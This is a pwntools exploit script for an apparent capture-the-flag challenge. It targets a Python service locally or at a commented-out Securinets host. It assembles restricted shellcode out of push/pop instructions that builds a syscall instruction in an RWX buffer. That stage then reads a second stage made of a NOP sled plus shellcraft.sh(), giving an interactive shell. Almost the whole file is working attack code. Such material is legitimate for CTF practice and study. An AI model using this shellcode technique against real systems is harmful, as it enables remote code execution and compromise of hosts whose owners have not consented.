from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './main.py'
HOST = '0'
PORT =  1337
#HOST = 'pwn-14caf623.p1.securinets.tn'
#PORT =  9001
#elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(["python3", TARGET])
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [])

payload = b''
#payload += asm('int3')

# make (stack_addr & 0xffffffffffff0000) | 1
payload += asm('push si')
payload += asm('pop bx')

# ready for syscall_read ( rsi: rwx buffer )
payload += asm('push r11')
payload += asm('pop rsi')

# ready for syscall_read ( rdx part1: zero )
payload += asm('push rax')
payload += asm('pop rdx')

# ready for syscall_read ( rdx part2: some 2bytes value )
payload += asm('push r9')
payload += asm('pop dx')

# change rsp to (stack_addr & 0xffffffffffff0000) | 1
payload += asm('push rbx')
payload += asm('pop rsp')


# rsp += 0x510
payload += asm('pop rcx')*(0x510 // 8)

# rsp -= 2 ( Low 2bytes will be 0x050f )
payload += asm('push bx')

# save 0x50f to r8
payload += asm('push rsp')
payload += asm('pop r8')

# change rsp to rwx
payload += asm('push r11')
payload += asm('pop rsp')

# step over rip
payload += asm('pop rcx')*(0xe0 // 8)

# insert 0x50f aka syscall
payload += asm('push r8')

# run until syscall
payload += asm('pop rcx')
payload += asm('pop rcx')
payload += asm('pop rcx')
payload += asm('pop rcx')
payload += asm('pop rcx')
payload += asm('pop rcx')
payload += asm('pop rcx')
payload = b64e(payload).encode()

#pause()
r.sendlineafter(b' : ', payload)
sleep(1)
r.send(b'\x90'*0x300+asm(shellcraft.sh()))

r.interactive()
r.close()

